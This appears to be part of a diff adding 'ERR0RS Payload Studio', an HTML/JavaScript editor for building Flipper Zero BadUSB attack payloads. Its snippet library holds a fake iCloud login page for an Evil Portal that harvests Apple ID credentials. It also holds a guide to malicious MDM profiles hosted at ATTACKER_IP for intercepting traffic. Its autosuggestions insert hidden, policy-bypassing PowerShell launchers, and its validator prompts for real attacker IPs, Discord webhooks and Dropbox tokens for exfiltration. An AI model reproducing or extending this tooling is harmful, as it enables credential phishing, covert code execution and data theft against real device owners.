+      code: "REM Evil Portal \u2014 iCloud login phishing page\nREM Deploy HTML file to Flipper Zero WiFi dev board\nREM See: /evil_portal/ directory for full HTML template\nREM\nREM SETUP:\nREM 1. Copy portal HTML to Flipper SD: apps_data/evil_portal/index.html\nREM 2. Enable Evil Portal in Flipper WiFi app\nREM 3. Target iOS device connects to rogue AP\nREM 4. Captive portal shows fake iCloud login\nREM 5. Credentials saved to Flipper SD log\nREM\nREM TEMPLATE:\nREM <!DOCTYPE html><html><head><title>iCloud</title></head>\nREM <body><form action='/save' method='post'>\nREM <input name='user' placeholder='Apple ID'>\nREM <input name='pass' type='password' placeholder='Password'>\nREM <button type='submit'>Sign In</button></form></body></html>",
+    },
+    {
+      id: "ios_mdm_profile_note",
+      title: "Malicious MDM Profile Reference",
+      category: "surveillance",
+      difficulty: "Advanced",
+      tags: ["mdm", "mobileconfig", "ios", "profile", "surveillance"],
+      desc: "Reference for creating malicious .mobileconfig MDM profiles. Install via AirDrop or web link.",
+      platform: "ios",
+      code: "REM MDM PROFILE ATTACK \u2014 reference only, no DuckyScript\nREM\nREM .mobileconfig files can:\nREM   - Install attacker CA certificates (MITM HTTPS)\nREM   - Configure VPN to route traffic through attacker\nREM   - Restrict device settings\nREM   - Install managed apps silently\nREM\nREM DELIVERY:\nREM   - Host .mobileconfig at http://ATTACKER_IP/profile.mobileconfig\nREM   - Send link via Evil Portal, AirDrop, iMessage\nREM   - iOS prompts: 'Do you want to install this profile?'\nREM\nREM CREATION TOOL:\nREM   Apple Configurator 2 (Mac App Store, free)\nREM   iphone-backup-analyzer for inspection",
+    },
+  ],
+};
+</script>
+
+<script>
+'use strict';
+
+// ══════════════════════════════════════════════════════════
+// DUCKY COMMAND REFERENCE — for cheatsheet + line explainer
+// ══════════════════════════════════════════════════════════
+const DUCKY_REF = [
+  {cmd:"REM",       desc:"Comment — not executed"},
+  {cmd:"STRING",    desc:"Type text instantly"},
+  {cmd:"STRINGLN",  desc:"Type text + press Enter"},
+  {cmd:"DELAY",     desc:"Wait N milliseconds"},
+  {cmd:"GUI r",     desc:"Win+R → Open Run dialog"},
+  {cmd:"GUI SPACE", desc:"Cmd+Space → Spotlight (Mac)"},
+  {cmd:"CTRL ALT",  desc:"Ctrl+Alt+key combination"},
+  {cmd:"ENTER",     desc:"Press Enter key"},
+  {cmd:"TAB",       desc:"Press Tab key"},
+  {cmd:"ESCAPE",    desc:"Press Escape"},
+  {cmd:"BACKSPACE", desc:"Press Backspace"},
+  {cmd:"UPARROW",   desc:"Up arrow key"},
+  {cmd:"DOWNARROW", desc:"Down arrow key"},
+  {cmd:"WAIT_FOR_BUTTON_PRESS", desc:"Pause until Flipper button pressed"},
+  {cmd:"REPEAT",    desc:"Repeat last command N times"},
+  {cmd:"DEFAULT_DELAY", desc:"Set delay between all commands"},
+  {cmd:"VAR",       desc:"Declare variable (DS 3.0)"},
+  {cmd:"IF",        desc:"Conditional (DS 3.0)"},
+  {cmd:"WHILE",     desc:"Loop (DS 3.0)"},
+];
+
+// ══════════════════════════════════════════════════════════
+// CONTEXT-AWARE AUTOSUGGESTION ENGINE
+// ══════════════════════════════════════════════════════════
+const CONTEXT_RULES = [
+  // After GUI r — always need a delay then STRING
+  { match: /^GUI\s+r\s*$/i,
+    suggest: [
+      {text:"DELAY 500\nSTRING ", title:"Wait for Run dialog → type command", conf:0.99},
+      {text:"DELAY 1000\nSTRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"", title:"Hidden PowerShell after Win+R", conf:0.9},
+      {text:"DELAY 600\nSTRING cmd /c ", title:"CMD command after Win+R", conf:0.8},
+    ]
+  },
+  // After GUI SPACE — Spotlight
+  { match: /^GUI\s+SPACE\s*$/i,
+    suggest: [
+      {text:"DELAY 800\nSTRING terminal\nDELAY 600\nENTER\nDELAY 1200", title:"Open Terminal via Spotlight", conf:0.98},
+      {text:"DELAY 800\nSTRING ", title:"Type Spotlight search query", conf:0.7},
+    ]
+  },
+  // After STRING (no ENTER yet)
+  { match: /^STRING\s+.+$/i,
+    suggest: [
+      {text:"ENTER", title:"Press Enter to execute", conf:0.95},
+      {text:"DELAY 300\nENTER", title:"Short delay then execute", conf:0.7},
+    ]
+  },
+  // After STRINGLN (already has enter)
+  { match: /^STRINGLN\s+.+$/i,
+    suggest: [
+      {text:"DELAY 1000", title:"Wait for command to execute", conf:0.85},
+    ]
+  },
+  // After ENTER
+  { match: /^ENTER\s*$/i,
+    suggest: [
+      {text:"DELAY 1000", title:"Wait for command to run", conf:0.9},
+      {text:"DELAY 2000", title:"Wait longer for slow operations", conf:0.6},
+      {text:"STRING ", title:"Type next command", conf:0.5},
+    ]
+  },
+  // After DELAY
+  { match: /^DELAY\s+\d+\s*$/i,
+    suggest: [
+      {text:"STRING ", title:"Type a command after the delay", conf:0.8},
+      {text:"ENTER", title:"Press Enter after delay", conf:0.5},
+    ]
+  },
+  // PowerShell commands — suggest common follow-ups
+  { match: /STRING.*powershell.*/i,
+    suggest: [
+      {text:"ENTER", title:"Execute PowerShell command", conf:0.98},
+    ]
+  },
+  // Opening terminal on mac
+  { match: /STRING\s+terminal\s*$/i,
+    suggest: [
+      {text:"DELAY 600\nENTER\nDELAY 1200", title:"Open terminal then wait for it to load", conf:0.99},
+    ]
+  },
+];
+
+// Platform-specific quick-start suggestions (when editor is empty or just has header)
+const PLATFORM_STARTERS = {
+  windows: [
+    {text:"GUI r\nDELAY 500\nSTRING ", title:"Start Windows payload (Win+R)", conf:0.9},
+    {text:"GUI r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"", title:"Start stealthy PS payload", conf:0.85},
+  ],
+  macos: [
+    {text:"GUI SPACE\nDELAY 800\nSTRING terminal\nDELAY 600\nENTER\nDELAY 1200\nSTRING ", title:"Open terminal and run command", conf:0.9},
+  ],
+  android: [
+    {text:"DELAY 2000\nGUI\nDELAY 1000\n", title:"Start Android HID (home screen first)", conf:0.9},
+  ],
+  ios: [
+    {text:"REM iOS attack requires Evil Portal or OMG Cable\nREM See Vector Overview snippet in library\n", title:"iOS attack vector reminder", conf:0.9},
+  ],
+};
+
+// ══════════════════════════════════════════════════════════
+// STATE
+// ══════════════════════════════════════════════════════════
+let currentPlatform = 'windows';
+let currentCategory = 'all';
+let teachMode       = false;
+let suggestIdx      = -1;
+let suggestItems    = [];
+
+const editor   = document.getElementById('code-editor');
+const sugBox   = document.getElementById('suggest-box');
+const lineNums = document.getElementById('line-nums');
+
+// ══════════════════════════════════════════════════════════
+// PLATFORM SWITCHER
+// ══════════════════════════════════════════════════════════
+function setPlatform(platform) {
+  currentPlatform = platform;
+  document.querySelectorAll('.ptab').forEach(t => t.classList.remove('active'));
+  const map = {windows:'win',macos:'mac',android:'and',ios:'ios'};
+  document.querySelector(`.ptab.${map[platform]}`).classList.add('active');
+  document.getElementById('sb-platform').textContent = platform.toUpperCase();
+  currentCategory = 'all';
+  buildCategoryFilter();
+  renderSnippetList();
+  updateTargetInfo();
+}
+
+function buildCategoryFilter() {
+  const snips = SNIPPETS[currentPlatform] || [];
+  const cats  = ['all', ...new Set(snips.map(s => s.category))];
+  const cf    = document.getElementById('cat-filter');
+  cf.innerHTML = cats.map(c =>
+    `<div class="cat-btn${c===currentCategory?' active':''}" onclick="setCategory('${c}')">${c.toUpperCase()}</div>`
+  ).join('');
+}
+
+function setCategory(cat) {
+  currentCategory = cat;
+  document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+  renderSnippetList();
+}
+
+// ══════════════════════════════════════════════════════════
+// SNIPPET LIBRARY RENDERER
+// ══════════════════════════════════════════════════════════
+function renderSnippetList(filterText = '') {
+  const snips = (SNIPPETS[currentPlatform] || []).filter(s => {
+    if (currentCategory !== 'all' && s.category !== currentCategory) return false;
+    if (filterText) {
+      const q = filterText.toLowerCase();
+      return s.title.toLowerCase().includes(q)
+        || s.desc.toLowerCase().includes(q)
+        || s.tags.some(t => t.includes(q));
+    }
+    return true;
+  });
+
+  document.getElementById('sb-count').textContent = snips.length;
+  const list = document.getElementById('snippet-list');
+  list.innerHTML = snips.map((s,i) => `
+    <div class="snippet-card" id="snip-${s.id}" onclick="insertSnippet('${s.id}')">
+      <div class="sc-title">${s.title}</div>
+      <div class="sc-tags">
+        <span class="sc-diff ${s.difficulty}">${s.difficulty}</span>
+        ${s.tags.slice(0,3).map(t=>`<span class="sc-tag">${t}</span>`).join('')}
+      </div>
+    </div>
+  `).join('') || `<div style="padding:16px;color:var(--text-dim);font-size:.6rem;text-align:center;">No payloads found</div>`;
+}
+
+function filterSnippets() {
+  renderSnippetList(document.getElementById('lib-search').value);
+}
+
+// ══════════════════════════════════════════════════════════
+// SNIPPET INSERTION
+// ══════════════════════════════════════════════════════════
+function insertSnippet(id) {
+  const snip = (SNIPPETS[currentPlatform]||[]).find(s=>s.id===id);
+  if (!snip) return;
+
+  const start = editor.selectionStart;
+  const before = editor.value.substring(0, start);
+  const after  = editor.value.substring(start);
+  const prefix = before.length > 0 && !before.endsWith('\n') ? '\n' : '';
+  editor.value = before + prefix + snip.code + '\n' + after;
+
+  // Move cursor to end of inserted snippet
+  const newPos = start + prefix.length + snip.code.length + 1;
+  editor.setSelectionRange(newPos, newPos);
+  editor.focus();
+
+  onEditorInput();
+  closeSuggest();
+
+  // Highlight the card
+  document.querySelectorAll('.snippet-card').forEach(c=>c.classList.remove('active'));
+  const card = document.getElementById(`snip-${id}`);
+  if (card) card.classList.add('active');
+
+  if (teachMode) showTeachForSnippet(snip);
+}
+
+// ══════════════════════════════════════════════════════════
+// EDITOR: input, keydown, line numbers, meta
+// ══════════════════════════════════════════════════════════
+function onEditorInput() {
+  updateLineNumbers();
+  updateMeta();
+  updateStatusBar();
+  explainCurrentLine();
+  triggerSuggestions();
+}
+
+function onEditorKey(e) {
+  // Tab → insert 2 spaces or trigger autocomplete
+  if (e.key === 'Tab') {
+    e.preventDefault();
+    if (suggestItems.length > 0) {
+      confirmSuggest();
+    } else {
+      triggerSuggestions(true);
+    }
+    return;
+  }
+  // Ctrl+Space → force suggestions
+  if (e.key === ' ' && e.ctrlKey) {
+    e.preventDefault();
+    triggerSuggestions(true);
+    return;
+  }
+  // Arrow keys in suggest box
+  if (sugBox.style.display !== 'none') {
+    if (e.key === 'ArrowDown') { e.preventDefault(); moveSuggest(1); return; }
+    if (e.key === 'ArrowUp')   { e.preventDefault(); moveSuggest(-1); return; }
+    if (e.key === 'Enter')     { e.preventDefault(); confirmSuggest(); return; }
+    if (e.key === 'Escape')    { closeSuggest(); return; }
+  }
+}
+
+function onEditorKeyUp(e) {
+  updateStatusBar();
+}
+
+function onEditorClick() {
+  closeSuggest();
+  explainCurrentLine();
+  updateStatusBar();
+}
+
+function updateLineNumbers() {
+  const lines = editor.value.split('\n').length;
+  lineNums.innerHTML = Array.from({length: Math.max(lines, 20)}, (_,i) =>
+    `<div class="ln">${i+1}</div>`
+  ).join('');
+}
+
+function updateMeta() {
+  const lines = editor.value.split('\n').length;
+  const chars = editor.value.length;
+  document.getElementById('editor-meta').textContent =
+    `${lines} lines · ${chars} chars · DuckyScript`;
+}
+
+function updateStatusBar() {
+  const pos = editor.selectionStart;
+  const before = editor.value.substring(0, pos);
+  const lineNum = before.split('\n').length;
+  const lastNL  = before.lastIndexOf('\n');
+  const col     = pos - lastNL;
+  document.getElementById('sb-line').textContent = lineNum;
+  document.getElementById('sb-col').textContent  = col;
+}
+
+// ══════════════════════════════════════════════════════════
+// LINE EXPLAINER
+// ══════════════════════════════════════════════════════════
+function explainCurrentLine() {
+  const pos    = editor.selectionStart;
+  const text   = editor.value;
+  const start  = text.lastIndexOf('\n', pos - 1) + 1;
+  const end    = text.indexOf('\n', pos);
+  const line   = text.substring(start, end === -1 ? text.length : end).trim();
+  const lineNo = text.substring(0, start).split('\n').length;
+
+  document.getElementById('explain-line').textContent = `Line ${lineNo}: "${line.substring(0,50)}"`;
+
+  if (!line) {
+    document.getElementById('explain-cmd').textContent  = 'Empty line';
+    document.getElementById('explain-text').textContent = 'Blank lines are ignored by DuckyScript';
+    return;
+  }
+
+  const parts = line.split(/\s+/);
+  const cmd   = parts[0].toUpperCase();
+  const arg   = parts.slice(1).join(' ');
+
+  const EXPLAIN = {
+    'REM':      ['Comment', `Not executed. Use for notes and documentation.`],
+    'STRING':   ['Type Text', `Types "${arg.substring(0,40)}" keystroke-by-keystroke into the active window.`],
+    'STRINGLN': ['Type Text + Enter', `Types "${arg.substring(0,40)}" then presses Enter automatically.`],
+    'DELAY':    ['Wait', `Pauses ${arg}ms (${(parseInt(arg)||0)/1000}s) — gives time for windows/processes to load.`],
+    'GUI':      ['Windows/CMD Key', arg.toUpperCase()==='R' ? 'Opens Windows Run dialog (Win+R)' : arg.toUpperCase()==='SPACE' ? 'Opens macOS Spotlight (Cmd+Space)' : `GUI+${arg} key combo`],
+    'ENTER':    ['Press Enter', 'Presses the Enter key. Executes the typed command.'],
+    'CTRL':     ['Ctrl Key', `Ctrl+${arg} keyboard shortcut.`],
+    'ALT':      ['Alt Key', `Alt+${arg} keyboard shortcut.`],
+    'SHIFT':    ['Shift Key', `Shift+${arg} keyboard shortcut.`],
+    'TAB':      ['Tab Key', 'Presses Tab — moves focus between fields/autocompletes.'],
+    'ESCAPE':   ['Escape Key', 'Presses Escape — closes dialogs, cancels prompts.'],
+    'BACKSPACE':['Backspace', 'Deletes the character before the cursor.'],
+    'UPARROW':  ['↑ Up Arrow', 'Navigates up — useful for command history in terminal.'],
+    'DOWNARROW':['↓ Down Arrow', 'Navigates down.'],
+    'HOME':     ['Home Key', 'Moves cursor to start of line.'],
+    'END':      ['End Key', 'Moves cursor to end of line.'],
+    'WAIT_FOR_BUTTON_PRESS': ['⏸ Wait for Flipper Button', 'Pauses the entire script until you physically press the Flipper Zero button. Use for operator-triggered payloads.'],
+    'REPEAT':   ['Repeat', `Repeats the previous command ${arg} times.`],
+    'DEFAULT_DELAY': ['Set Default Delay', `Sets a ${arg}ms pause after EVERY command automatically.`],
+    'VAR':      ['Variable (DS 3.0)', `Declares variable: ${arg} — DuckyScript 3.0 feature.`],
+    'IF':       ['Conditional (DS 3.0)', 'If/then logic — DuckyScript 3.0 only.'],
+    'WHILE':    ['Loop (DS 3.0)', 'Repeat block while condition is true — DuckyScript 3.0.'],
+  };
+
+  const info = EXPLAIN[cmd];
+  if (info) {
+    document.getElementById('explain-cmd').textContent  = info[0];
+    document.getElementById('explain-text').textContent = info[1];
+  } else {
+    document.getElementById('explain-cmd').textContent  = cmd;
+    document.getElementById('explain-text').textContent = `DuckyScript command: ${line.substring(0,60)}`;
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+// AUTOSUGGESTION ENGINE
+// ══════════════════════════════════════════════════════════
+function getCurrentLine() {
+  const pos   = editor.selectionStart;
+  const text  = editor.value;
+  const start = text.lastIndexOf('\n', pos - 1) + 1;
+  const end   = text.indexOf('\n', pos);
+  return text.substring(start, end === -1 ? text.length : end);
+}
+
+function triggerSuggestions(force = false) {
+  const line    = getCurrentLine().trim();
+  const isEmpty = editor.value.replace(/\s+/g,'').length < 10;
+  let found     = [];
+
+  // Context-rule matching
+  for (const rule of CONTEXT_RULES) {
+    if (rule.match.test(line)) {
+      found = rule.suggest.map(s => ({...s}));
+      break;
+    }
+  }
+
+  // Empty editor → platform starters
+  if (!found.length && (isEmpty || force)) {
+    found = (PLATFORM_STARTERS[currentPlatform]||[]).map(s=>({...s}));
+  }
+
+  // Keyword-based snippet suggestions
+  if (!found.length && line.length > 2) {
+    const q = line.toLowerCase();
+    (SNIPPETS[currentPlatform]||[]).forEach(s => {
+      if (s.title.toLowerCase().includes(q) || s.tags.some(t=>t.includes(q))) {
+        found.push({text: s.code, title: `📦 ${s.title}`, conf: 0.7, badge:'SNIPPET'});
+      }
+    });
+  }
+
+  if (!found.length) { closeSuggest(); return; }
+
+  suggestItems = found.sort((a,b)=>b.conf-a.conf).slice(0,6);
+  renderSuggest();
+}
+
+function renderSuggest() {
+  if (!suggestItems.length) { closeSuggest(); return; }
+
+  // Position suggest box
+  const rect    = editor.getBoundingClientRect();
+  const pos     = editor.selectionStart;
+  const lines   = editor.value.substring(0, pos).split('\n');
+  const lineH   = 13 * 1.6; // font-size * line-height
+  const topOff  = (lines.length) * lineH + 12;
+  const padLeft = 54;
+
+  sugBox.style.left    = `${padLeft}px`;
+  sugBox.style.top     = `${Math.min(topOff, editor.clientHeight - 220)}px`;
+
+  suggestIdx = -1;
+  sugBox.innerHTML = suggestItems.map((s,i) => `
+    <div class="sug-item" onclick="applySuggest(${i})">
+      <div class="sug-title">${s.title}${s.badge?`<span class="sug-badge">${s.badge}</span>`:''}</div>
+      <div class="sug-preview">${s.text.split('\n')[0]}</div>
+    </div>
+  `).join('');
+  sugBox.style.display = 'flex';
+}
+
+function moveSuggest(dir) {
+  suggestIdx = Math.max(-1, Math.min(suggestItems.length-1, suggestIdx+dir));
+  document.querySelectorAll('.sug-item').forEach((el,i) => {
+    el.classList.toggle('selected', i===suggestIdx);
+  });
+}
+
+function confirmSuggest() {
+  const idx = suggestIdx >= 0 ? suggestIdx : 0;
+  if (idx < suggestItems.length) applySuggest(idx);
+}
+
+function applySuggest(idx) {
+  const s     = suggestItems[idx];
+  const pos   = editor.selectionStart;
+  const text  = editor.value;
+  const start = text.lastIndexOf('\n', pos - 1) + 1;
+  const end   = text.indexOf('\n', pos);
+  const lineEnd = end === -1 ? text.length : end;
+
+  // Replace current line with suggestion (append after)
+  const before = text.substring(0, lineEnd);
+  const after  = text.substring(lineEnd);
+  const nl     = before.endsWith('\n') ? '' : '\n';
+  editor.value = before + nl + s.text + after;
+  const newPos = lineEnd + nl.length + s.text.length;
+  editor.setSelectionRange(newPos, newPos);
+  editor.focus();
+
+  closeSuggest();
+  onEditorInput();
+}
+
+function closeSuggest() {
+  sugBox.style.display = 'none';
+  suggestItems = [];
+  suggestIdx   = -1;
+}
+
+document.addEventListener('click', e => {
+  if (!sugBox.contains(e.target) && e.target !== editor) closeSuggest();
+});
+</script>
+
+<script>
+'use strict';
+
+// ══════════════════════════════════════════════════════════
+// TARGET INFO PANEL
+// ══════════════════════════════════════════════════════════
+const TARGET_INFO = {
+  windows:     {format:'DuckyScript 1.0', device:'Flipper Zero / USB Rubber Ducky', kb:'en-US'},
+  windows7:    {format:'DuckyScript 1.0', device:'Flipper Zero / USB Rubber Ducky', kb:'en-US'},
+  macos:       {format:'DuckyScript 1.0', device:'Flipper Zero (macOS layout)', kb:'en-US (Mac)'},
+  android:     {format:'DuckyScript 1.0', device:'Flipper Zero (HID keyboard)', kb:'en-US'},
+  android_adb: {format:'ADB Commands',    device:'Android Debug Bridge (USB)', kb:'N/A'},
+  ios:         {format:'Evil Portal / .mobileconfig', device:'Flipper Zero + WiFi Board', kb:'N/A'},
+  linux:       {format:'DuckyScript 1.0', device:'Flipper Zero / USB Rubber Ducky', kb:'en-US'},
+  chromeos:    {format:'DuckyScript 1.0', device:'Flipper Zero', kb:'en-US'},
+};
+
+function onTargetChange() {
+  updateTargetInfo();
+}
+
+function updateTargetInfo() {
+  const sel = document.getElementById('target-os-select').value;
+  const info = TARGET_INFO[sel] || TARGET_INFO['windows'];
+  document.getElementById('format-label').textContent = info.format;
+  document.getElementById('device-label').textContent = info.device;
+  document.getElementById('kb-label').textContent     = info.kb;
+}
+
+// ══════════════════════════════════════════════════════════
+// CHEATSHEET BUILDER
+// ══════════════════════════════════════════════════════════
+function buildCheatsheet() {
+  const cs = document.getElementById('cheatsheet');
+  cs.innerHTML = DUCKY_REF.map(d => `
+    <div class="cs-cmd">
+      <span class="cs-key">${d.cmd}</span>
+      <span class="cs-desc">${d.desc}</span>
+    </div>
+  `).join('');
+}
+
+// ══════════════════════════════════════════════════════════
+// TEACH MODE
+// ══════════════════════════════════════════════════════════
+function toggleTeachMode() {
+  teachMode = !teachMode;
+  const btn = document.getElementById('teach-mode-btn');
+  btn.textContent = teachMode ? '📚 TEACH: ON' : '📚 TEACH: OFF';
+  btn.style.borderColor  = teachMode ? 'var(--amber)' : '';
+  btn.style.color        = teachMode ? 'var(--amber)' : '';
+  btn.style.background   = teachMode ? 'rgba(255,170,0,.12)' : '';
+  document.getElementById('ai-status').textContent =
+    teachMode ? '📚 TEACH MODE — explanations active' : '⚡ ERR0RS AI READY';
+}
+
+function showTeachForSnippet(snip) {
+  document.getElementById('explain-cmd').textContent  = `📦 ${snip.title} [${snip.category}]`;
+  document.getElementById('explain-text').textContent = snip.desc;
+  document.getElementById('explain-line').textContent =
+    `Difficulty: ${snip.difficulty} · Tags: ${snip.tags.join(', ')}`;
+}
+
+// ══════════════════════════════════════════════════════════
+// PAYLOAD VALIDATION
+// ══════════════════════════════════════════════════════════
+function validatePayload() {
+  const lines   = editor.value.split('\n');
+  const errors  = [];
+  const warnings = [];
+
+  lines.forEach((line, i) => {
+    const l = line.trim();
+    if (!l) return;
+    const parts = l.split(/\s+/);
+    const cmd   = parts[0].toUpperCase();
+
+    // Check DELAY value is a number
+    if (cmd === 'DELAY' && parts[1] && isNaN(parts[1])) {
+      errors.push(`Line ${i+1}: DELAY requires a number, got "${parts[1]}"`);
+    }
+    // Check STRING has content
+    if (cmd === 'STRING' && parts.length < 2) {
+      warnings.push(`Line ${i+1}: STRING is empty`);
+    }
+    // Check for ATTACKER_IP placeholder
+    if (l.includes('ATTACKER_IP')) {
+      warnings.push(`Line ${i+1}: Replace ATTACKER_IP with real IP address`);
+    }
+    if (l.includes('WEBHOOK_URL')) {
+      warnings.push(`Line ${i+1}: Replace WEBHOOK_URL with real Discord webhook URL`);
+    }
+    if (l.includes('DROPBOX_TOKEN')) {
+      warnings.push(`Line ${i+1}: Replace DROPBOX_TOKEN with real Dropbox API token`);
+    }
+    if (l.includes('NETWORK_NAME')) {
+      warnings.push(`Line ${i+1}: Replace NETWORK_NAME with real WiFi network name`);
+    }
+  });
+
+  let msg = '';
+  if (!errors.length && !warnings.length) {
+    msg = '✅ Payload looks valid!';
+  } else {
+    msg = '';
+    if (errors.length)   msg += `❌ ${errors.length} error(s): ${errors[0]}  `;
+    if (warnings.length) msg += `⚠️ ${warnings.length} warning(s): ${warnings[0]}`;
+  }
+  document.getElementById('deploy-status').textContent = msg;
+  setTimeout(() => document.getElementById('deploy-status').textContent = '', 5000);
+}
+
+// ══════════════════════════════════════════════════════════
+// DEPLOY / EXPORT
+// ══════════════════════════════════════════════════════════
+function savePayload() {
+  const name    = document.getElementById('payload-name-input').value || 'payload.txt';
+  const content = editor.value;
+  const blob    = new Blob([content], {type:'text/plain'});
+  const a       = document.createElement('a');
+  a.href        = URL.createObjectURL(blob);
+  a.download    = name.endsWith('.txt') ? name : name + '.txt';
+  a.click();
+  setStatus('💾 Saved: ' + a.download);
+}
+
+function copyPayload() {
+  navigator.clipboard.writeText(editor.value).then(() => {
+    setStatus('📋 Copied to clipboard!');
+  }).catch(() => {
+    // fallback
+    editor.select();
+    document.execCommand('copy');
+    setStatus('📋 Copied!');
+  });
+}
+
+function deployToFlipper() {
+  setStatus('🐬 Flipper deploy: Save the file and copy to SD:/badusb/');
+  savePayload();
+  setTimeout(() => {
+    setStatus('📁 Place file in Flipper SD: apps_data/BadUSB/ or SD:/badusb/');
+  }, 1500);
+}
+
+function setStatus(msg) {
+  document.getElementById('deploy-status').textContent = msg;
+  setTimeout(() => document.getElementById('deploy-status').textContent = '', 5000);
+}
+
+// ══════════════════════════════════════════════════════════
+// NEW / LOAD
+// ══════════════════════════════════════════════════════════
+function newPayload() {
+  if (editor.value.trim() && !confirm('Clear current payload? Changes will be lost.')) return;
+  editor.value = `REM ═══════════════════════════════════════
+REM  PAYLOAD: [NAME]
+REM  TARGET:  ${document.getElementById('target-os-select').value.toUpperCase()}
+REM  AUTHOR:  ERR0RS
+REM  VERSION: 1.0
+REM ═══════════════════════════════════════
+
+DELAY 2000
+`;
+  document.getElementById('payload-name-input').value = 'new_payload.txt';
+  onEditorInput();
+  editor.focus();
+}
+
+function loadPayload() {
+  const inp = document.createElement('input');
+  inp.type  = 'file';
+  inp.accept = '.txt,.ducky,.script';
+  inp.onchange = e => {
+    const f = e.target.files[0];
+    if (!f) return;
+    const r = new FileReader();
+    r.onload = ev => {
+      editor.value = ev.target.result;
+      document.getElementById('payload-name-input').value = f.name;
+      onEditorInput();
+      setStatus('📂 Loaded: ' + f.name);
+    };
+    r.readAsText(f);
+  };
+  inp.click();
+}
+
+// ══════════════════════════════════════════════════════════
+// BOOT
+// ══════════════════════════════════════════════════════════
+buildCheatsheet();
+setPlatform('windows');
+updateTargetInfo();
+updateLineNumbers();
+
+// Default starter content
+editor.value = `REM ═══════════════════════════════════════
+REM  ERR0RS PAYLOAD STUDIO
+REM  Select a snippet from the left panel
+REM  or start typing — autosuggestion activates
+REM  TAB or CTRL+SPACE to force suggestions
+REM ═══════════════════════════════════════
+
+DELAY 2000
+`;
+onEditorInput();
+editor.focus();
+</script>
+
+</body>
+</html>
